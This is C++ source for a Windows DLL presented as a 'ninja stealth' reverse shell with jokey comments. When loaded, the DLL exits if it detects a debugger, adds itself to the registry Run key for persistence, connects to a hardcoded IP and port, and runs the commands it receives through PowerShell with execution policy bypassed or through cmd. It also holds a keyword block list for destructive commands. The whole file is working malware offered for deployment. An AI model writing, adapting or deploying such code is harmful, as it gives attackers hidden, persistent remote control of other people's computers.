// 🥷 Ninja Stealth Reverse Shell DLL
// Ancient ninja scroll containing socket combat techniques for DLL deployment

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <thread>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

#define BUFFER_SIZE 4096
#define ENCRYPTION_KEY 0xAA // Ancient ninja encryption key (can be customized)

// Ancient ninja encryption technique - simple but effective for basic obfuscation
std::string encrypt(const std::string& data, char key) {
    std::string encrypted = data;
    for (size_t i = 0; i < encrypted.length(); ++i) {
        encrypted[i] ^= key;
    }
    return encrypted;
}

// Ancient ninja decryption technique - reversing the shadow weave
std::string decrypt(const std::string& data, char key) {
    return encrypt(data, key); // XOR is symmetric like a ninja's dual blades
}

// Ninja code of honor - blocking forbidden techniques that could harm the innocent
bool validate_command(const std::string& command) {
    std::vector<std::string> blocked_commands = {
        "format", "del", "delete", "rd", "rmdir", "shutdown", "restart",
        "remove-item", "ri", "rm", "rmdir", "format-volume", "stop-computer"
    };
    std::string lower_command = command;
    std::transform(lower_command.begin(), lower_command.end(), lower_command.begin(), ::tolower);
    for (const auto& blocked : blocked_commands) {
        if (lower_command.find(blocked) != std::string::npos) {
            return false;
        }
    }
    return true;
}

// Ninja stealth mode activation - vanishing from enemy radar before the mission
void evade_analysis() {
    // Checking for debugging attempts - ninjas hate being watched
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // Delayed activation - patience is a ninja virtue
    std::this_thread::sleep_for(std::chrono::seconds(2));
}

// The shadow warrior's main technique - establishing hidden communication
void reverse_shell(const std::string& ip, int port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    
    // Initializing the ancient Windows socket combat techniques
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }
    
    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        
        server.sin_addr.s_addr = inet_addr(ip.c_str());
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        
        char buffer[BUFFER_SIZE];
        while (true) {
            memset(buffer, 0, BUFFER_SIZE);
            int bytesReceived = recv(sock, buffer, BUFFER_SIZE - 1, 0);
            if (bytesReceived <= 0) {
                break;
            }
            buffer[bytesReceived] = '\0';
            std::string command = std::string(buffer);
            command.erase(command.find_last_not_of("\r\n\t ") + 1);
            
            // Ninja code review - making sure no forbidden jutsu are being cast
            if (!validate_command(command)) {
                std::string errorMsg = "Command blocked for security reasons\n";
                send(sock, errorMsg.c_str(), errorMsg.size(), 0);
                continue;
            }
            
            // Summoning the command execution demon (safely contained in a scroll)
            std::string result;
            
            // Try PowerShell first, fallback to cmd if needed
            std::string powershell_command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
            FILE* pipe = _popen(powershell_command.c_str(), "r");
            
            if (!pipe) {
                // Fallback to cmd.exe if PowerShell fails
                std::string cmd_command = "cmd /c " + command;
                pipe = _popen(cmd_command.c_str(), "r");
            }
            
            if (pipe) {
                char tempBuffer[1024];
                while (fgets(tempBuffer, sizeof(tempBuffer), pipe) != NULL) {
                    result += tempBuffer;
                }
                _pclose(pipe);
                
                if (result.empty()) {
                    result = "Command executed successfully (no output)\n";
                }
            } else {
                result = "Failed to execute command: " + command + "\n";
            }
            
            // Send plain text result (no encryption for netcat compatibility)
            send(sock, result.c_str(), result.size(), 0);
        }
        
        closesocket(sock);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    
    WSACleanup();
}

// Ninja infiltration technique - hiding in the Windows registry shadows
void persist() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "NinjaStealth", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
    }
}

// DLL entry point - the ninja's secret entrance
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Launch reverse shell in a separate thread to avoid blocking the host process
            std::thread([]() {
                evade_analysis();
                persist();
                
                // Ninja headquarters coordinates (configure these for your dojo)
                std::string ip = "192.168.0.1";
                int port = 4444;
                
                reverse_shell(ip, port);
            }).detach();
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// Export function for manual loading - the ninja's public identity
extern "C" __declspec(dllexport) void StartNinjaStealth() {
    evade_analysis();
    persist();
    
    std::string ip = "192.168.0.28";
    int port = 44895;
    
    reverse_shell(ip, port);
}

// Alternative export for different loading methods
extern "C" __declspec(dllexport) void InitializeNinja() {
    StartNinjaStealth();
}
